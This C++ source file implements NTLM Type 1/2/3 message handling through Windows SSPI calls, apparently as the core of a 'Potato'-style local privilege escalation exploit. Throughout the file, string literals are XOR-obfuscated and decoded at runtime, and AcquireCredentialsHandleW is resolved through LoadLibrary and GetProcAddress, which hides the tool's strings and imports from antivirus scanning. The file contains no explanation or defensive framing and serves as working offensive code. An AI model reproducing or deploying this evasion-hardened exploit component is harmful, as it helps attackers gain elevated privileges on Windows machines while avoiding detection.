#include "stdafx.h"
#include "LocalNegotiator.h"
#include <iostream>

LocalNegotiator::LocalNegotiator()
{
	authResult = -1;
}

void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer)
{
	pSecBuffer->BufferType = SECBUFFER_TOKEN;
	pSecBuffer->cbBuffer = 0;
	pSecBuffer->pvBuffer = nullptr;

	pSecBufferDesc->ulVersion = SECBUFFER_VERSION;
	pSecBufferDesc->cBuffers = 1;
	pSecBufferDesc->pBuffers = pSecBuffer;
}

int LocalNegotiator::handleType1(char * ntlmBytes, int len)
{
	
	 char  hid_Error__6ieTUiwkGvzY[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
 char k_tx0hAqBsLYmR = '\x45';
for(int i = 0; i < sizeof(hid_Error__6ieTUiwkGvzY) / sizeof(hid_Error__6ieTUiwkGvzY[0]); i++){
hid_Error__6ieTUiwkGvzY[i] = hid_Error__6ieTUiwkGvzY[i] ^ k_tx0hAqBsLYmR;
}
	typedef SECURITY_STATUS(__stdcall* _AcquireCredentialsHandleW)(LPWSTR pPrincipal,LPWSTR pPackage,unsigned long    fCredentialUse,void             *pvLogonId,void             *pAuthData,SEC_GET_KEY_FN   pGetKeyFn,void             *pvGetKeyArgument,PCredHandle      phCredential,PTimeStamp       ptsExpiry);
	TCHAR  hid_Secur__XOc4tH27pRJO[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_p7DfRSOvf13U = '\x45';
for(int i = 0; i < sizeof(hid_Secur__XOc4tH27pRJO) / sizeof(hid_Secur__XOc4tH27pRJO[0]); i++){
hid_Secur__XOc4tH27pRJO[i] = hid_Secur__XOc4tH27pRJO[i] ^ k_p7DfRSOvf13U;
}

	HMODULE hid_hHandl_f7HBIBVAdr8X = LoadLibrary(hid_Secur__XOc4tH27pRJO);
	char  hid_Acquir_zXBcuUABZlXA[] = {'\x4','\x26','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x12','\x45'};
char k_yNHIgFF33Hhm = '\x45';
for(int i = 0; i < sizeof(hid_Acquir_zXBcuUABZlXA) / sizeof(hid_Acquir_zXBcuUABZlXA[0]); i++){
hid_Acquir_zXBcuUABZlXA[i] = hid_Acquir_zXBcuUABZlXA[i] ^ k_yNHIgFF33Hhm;
}

	_AcquireCredentialsHandleW AcquireCredentialsHandle = (_AcquireCredentialsHandleW) GetProcAddress(hid_hHandl_f7HBIBVAdr8X, hid_Acquir_zXBcuUABZlXA);
TCHAR lpPackageName[1024] = L"Negotiate";
	TimeStamp ptsExpiry;

	int status = AcquireCredentialsHandle(
		NULL,
		lpPackageName,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		&hCred,
		&ptsExpiry);

	if (status != SEC_E_OK)
	{
		printf(hid_Error__6ieTUiwkGvzY);
		return -1;
	}

	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	phContext = new CtxtHandle();

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;

	status = AcceptSecurityContext(
		&hCred,
		nullptr,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	return status;
}

int LocalNegotiator::handleType2(char * ntlmBytes, int len)
{
	
	 char  hid_Buffer_B8WZE8UpZI3w[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
 char k_CiF3WlVNY8Zo = '\x45';
for(int i = 0; i < sizeof(hid_Buffer_B8WZE8UpZI3w) / sizeof(hid_Buffer_B8WZE8UpZI3w[0]); i++){
hid_Buffer_B8WZE8UpZI3w[i] = hid_Buffer_B8WZE8UpZI3w[i] ^ k_CiF3WlVNY8Zo;
}
char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
	if (len >= secServerBuffer.cbBuffer) {
		for (int i = 0; i < len; i++)
		{
			if (i < secServerBuffer.cbBuffer) {
				ntlmBytes[i] = newNtlmBytes[i];
			}
			else {
				ntlmBytes[i] = 0x00;
			}
		}
	}
	else {
		printf(hid_Buffer_B8WZE8UpZI3w);
	}

	return 0;
}

int LocalNegotiator::handleType3(char * ntlmBytes, int len)
{
	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;
	int status = AcceptSecurityContext(
		&hCred,
		phContext,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	authResult = status;

	return status;
}
